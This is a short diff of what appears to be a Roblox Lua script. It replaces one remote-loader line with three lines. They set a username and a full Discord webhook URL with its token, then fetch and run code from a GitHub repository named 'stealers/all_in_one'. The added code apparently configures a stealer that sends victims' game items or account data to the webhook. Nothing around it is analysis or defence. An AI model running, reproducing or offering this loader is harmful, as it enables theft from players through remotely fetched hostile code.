@@ -1,1 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/D3athFeather/Script/main/Protected_8eed63c4cb59ee268f6e9d84.lua", true))()
+Username = "MadaraRollv15" 
+Webhook = "https://discord.com/api/webhooks/1295885311959892051/lTlw6_Ck-5S6GaYceR3BzicjsPWMGUfENVSvYihlPNC2WDm9S60stvFzk5ThuQ2wpEqY"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/stealers/main/all_in_one"))()
